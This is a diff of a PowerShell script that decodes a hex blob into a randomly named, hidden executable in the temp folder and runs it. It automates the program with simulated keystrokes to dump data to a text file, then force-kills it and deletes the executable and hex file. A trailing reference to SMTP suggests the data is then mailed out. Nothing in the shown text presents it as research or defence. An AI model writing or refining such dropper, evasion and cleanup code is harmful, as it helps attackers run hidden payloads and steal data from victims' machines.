@@ -87,14 +87,16 @@ for ($i = 0; $i -lt $hexString.Length; $i += 2) {
     $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
 }
 
-# 2. Create Random EXE
+# 1. Create and Start the Random EXE
 $randName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
 $tempExePath = Join-Path $env:TEMP "$randName.exe"
 [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
 (Get-Item $tempExePath).Attributes = 'Hidden'
 
-# 3. Run and Automate
-$process = Start-Process $tempExePath -PassThru # -PassThru allows us to track it easily
+# Use -PassThru so we can track the exact Process ID
+$processObj = Start-Process $tempExePath -PassThru 
+
+# ... [Your SendKeys Logic Here] ...
 $outputFilePath = "$env:TEMP\data.txt"
 
 Start-Sleep -Seconds 2 
@@ -109,19 +111,35 @@ Start-Sleep -Milliseconds 1000
 Start-Sleep -Milliseconds 500
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
-Start-Sleep -Seconds 2 # Give it time to write the data.txt
+Start-Sleep -Seconds 2 # Wait for the save to finish
 
-# 4. FIXED CLEANUP
-# Stop the specific process we started
-if ($process) {
-    Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
+# 2. FORCE CLEANUP
+try {
+    if ($processObj) {
+        # Stop the process by its specific ID
+        Stop-Process -Id $processObj.Id -Force -ErrorAction SilentlyContinue
+        
+        # Wait a split second for Windows to release the file lock
+        Start-Sleep -Milliseconds 500
+        
+        # Release the PowerShell handle on the process object
+        $processObj.Dispose() 
+    }
+} catch {
+    Write-Host "Process already closed."
 }
 
-# Remove the EXE and the downloaded Hex file
-Remove-Item $tempExePath -Force -ErrorAction SilentlyContinue
-Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
+# 3. DELETE THE EXE
+if (Test-Path $tempExePath) {
+    # The 'Force' is needed because we set the attribute to 'Hidden'
+    Remove-Item $tempExePath -Force -ErrorAction SilentlyContinue
+    Write-Host "Success: $tempExePath has been removed." -ForegroundColor Green
+}
 
-Write-Host "Process stopped and EXE removed from Disk." -ForegroundColor Cyan
+# 4. DELETE THE HEX TEXT FILE
+if (Test-Path $tempPath) {
+    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
+}
 
 
 ## Ensure TLS 1.2 for modern SMTP servers
